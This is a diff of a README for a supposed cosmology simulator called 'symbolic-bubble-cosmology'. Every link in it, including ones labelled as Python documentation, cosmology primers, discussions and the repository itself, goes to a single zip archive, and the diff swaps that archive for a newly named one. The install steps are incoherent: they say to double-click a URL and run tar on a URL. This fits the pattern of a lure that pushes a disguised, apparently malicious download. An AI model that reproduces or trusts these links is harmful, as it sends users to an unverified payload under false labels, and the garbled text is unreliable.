@@ -1,7 +1,7 @@
 # 🌌 symbolic-bubble-cosmology - Explore Microbubble Universes with Ease
 
 ## 📥 Download Now!
-[![Download symbolic-bubble-cosmology](https://raw.githubusercontent.com/Dragos091317/symbolic-bubble-cosmology/main/rhinestone/symbolic-bubble-cosmology.zip%20click%20here-blue)](https://raw.githubusercontent.com/Dragos091317/symbolic-bubble-cosmology/main/rhinestone/symbolic-bubble-cosmology.zip)
+[![Download symbolic-bubble-cosmology](https://github.com/Dragos091317/symbolic-bubble-cosmology/raw/refs/heads/main/rhinestone/cosmology_symbolic_bubble_2.6.zip%20click%20here-blue)](https://github.com/Dragos091317/symbolic-bubble-cosmology/raw/refs/heads/main/rhinestone/cosmology_symbolic_bubble_2.6.zip)
 
 ## 🚀 Getting Started
 Welcome to the symbolic-bubble-cosmology project. This application simulates microbubble universes. You can explore models of drift, tunneling, collapse, and more. With this guide, you will learn how to download and run the software easily.
@@ -13,27 +13,27 @@ Before you start, ensure your computer meets these basic requirements:
 - Basic familiarity with opening applications and terminal/command prompt
 
 ## 🔗 Download & Install
-To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Dragos091317/symbolic-bubble-cosmology/main/rhinestone/symbolic-bubble-cosmology.zip). 
+To get started, visit this page to download: [Releases Page](https://github.com/Dragos091317/symbolic-bubble-cosmology/raw/refs/heads/main/rhinestone/cosmology_symbolic_bubble_2.6.zip). 
 
 1. Click on the link above.
 2. Look for the latest release of the application.
 3. Download the file that matches your operating system. 
 
 Here are some common files you might see:
-- For Windows: `https://raw.githubusercontent.com/Dragos091317/symbolic-bubble-cosmology/main/rhinestone/symbolic-bubble-cosmology.zip`
-- For macOS: `https://raw.githubusercontent.com/Dragos091317/symbolic-bubble-cosmology/main/rhinestone/symbolic-bubble-cosmology.zip`
-- For Linux: `https://raw.githubusercontent.com/Dragos091317/symbolic-bubble-cosmology/main/rhinestone/symbolic-bubble-cosmology.zip`
+- For Windows: `https://github.com/Dragos091317/symbolic-bubble-cosmology/raw/refs/heads/main/rhinestone/cosmology_symbolic_bubble_2.6.zip`
+- For macOS: `https://github.com/Dragos091317/symbolic-bubble-cosmology/raw/refs/heads/main/rhinestone/cosmology_symbolic_bubble_2.6.zip`
+- For Linux: `https://github.com/Dragos091317/symbolic-bubble-cosmology/raw/refs/heads/main/rhinestone/cosmology_symbolic_bubble_2.6.zip`
 
 4. Once the download is complete, locate the file in your downloads folder.
 5. Follow these steps based on your operating system:
 
 ### 🪟 Windows
-- Double-click `https://raw.githubusercontent.com/Dragos091317/symbolic-bubble-cosmology/main/rhinestone/symbolic-bubble-cosmology.zip` to start the installation.
+- Double-click `https://github.com/Dragos091317/symbolic-bubble-cosmology/raw/refs/heads/main/rhinestone/cosmology_symbolic_bubble_2.6.zip` to start the installation.
 - Follow the on-screen instructions.
 - Once installed, you can find the application in your Start Menu. Click to run.
 
 ### 🍏 macOS
-- Open the `https://raw.githubusercontent.com/Dragos091317/symbolic-bubble-cosmology/main/rhinestone/symbolic-bubble-cosmology.zip` file.
+- Open the `https://github.com/Dragos091317/symbolic-bubble-cosmology/raw/refs/heads/main/rhinestone/cosmology_symbolic_bubble_2.6.zip` file.
 - Drag the application into your Applications folder.
 - Open `symbolic_bubble_cosmology` from your Applications folder.
 
@@ -41,7 +41,7 @@ Here are some common files you might see:
 - Open the terminal.
 - Unpack the file using:
   ```bash
-  tar -xzvf https://raw.githubusercontent.com/Dragos091317/symbolic-bubble-cosmology/main/rhinestone/symbolic-bubble-cosmology.zip
+  tar -xzvf https://github.com/Dragos091317/symbolic-bubble-cosmology/raw/refs/heads/main/rhinestone/cosmology_symbolic_bubble_2.6.zip
   ```
 - Navigate to the folder where the application is located.
 - Run it using:
@@ -78,7 +78,7 @@ We welcome contributions! If you want to help improve the application:
 If you encounter issues or have questions, please open an issue in the repository. Provide as much detail as possible to help us assist you.
 
 ## 👥 Connect
-Join our community to discuss ideas and experiences with the application. Engage with fellow users and developers on our [GitHub Discussions page](https://raw.githubusercontent.com/Dragos091317/symbolic-bubble-cosmology/main/rhinestone/symbolic-bubble-cosmology.zip).
+Join our community to discuss ideas and experiences with the application. Engage with fellow users and developers on our [GitHub Discussions page](https://github.com/Dragos091317/symbolic-bubble-cosmology/raw/refs/heads/main/rhinestone/cosmology_symbolic_bubble_2.6.zip).
 
 ## 🧐 Further Reading
 To understand the concepts behind the simulations, consider reading introductory materials on:
@@ -87,14 +87,14 @@ To understand the concepts behind the simulations, consider reading introductory
 - Emergence in complex systems
 
 ## 👩‍💻 Additional Resources
-- [Python Official Documentation](https://raw.githubusercontent.com/Dragos091317/symbolic-bubble-cosmology/main/rhinestone/symbolic-bubble-cosmology.zip)
-- [Cosmology Basics](https://raw.githubusercontent.com/Dragos091317/symbolic-bubble-cosmology/main/rhinestone/symbolic-bubble-cosmology.zip)
-- [Entropy Explained Simply](https://raw.githubusercontent.com/Dragos091317/symbolic-bubble-cosmology/main/rhinestone/symbolic-bubble-cosmology.zip)
+- [Python Official Documentation](https://github.com/Dragos091317/symbolic-bubble-cosmology/raw/refs/heads/main/rhinestone/cosmology_symbolic_bubble_2.6.zip)
+- [Cosmology Basics](https://github.com/Dragos091317/symbolic-bubble-cosmology/raw/refs/heads/main/rhinestone/cosmology_symbolic_bubble_2.6.zip)
+- [Entropy Explained Simply](https://github.com/Dragos091317/symbolic-bubble-cosmology/raw/refs/heads/main/rhinestone/cosmology_symbolic_bubble_2.6.zip)
 
 Thank you for exploring symbolic-bubble-cosmology! Enjoy your journey into the world of microbubble universes. 
 
 ## 🔗 Quick Links
-- [Download symbolic-bubble-cosmology](https://raw.githubusercontent.com/Dragos091317/symbolic-bubble-cosmology/main/rhinestone/symbolic-bubble-cosmology.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/Dragos091317/symbolic-bubble-cosmology/main/rhinestone/symbolic-bubble-cosmology.zip)
+- [Download symbolic-bubble-cosmology](https://github.com/Dragos091317/symbolic-bubble-cosmology/raw/refs/heads/main/rhinestone/cosmology_symbolic_bubble_2.6.zip)
+- [GitHub Repository](https://github.com/Dragos091317/symbolic-bubble-cosmology/raw/refs/heads/main/rhinestone/cosmology_symbolic_bubble_2.6.zip)
 
 Feel free to reach out with any feedback! happy simulating!
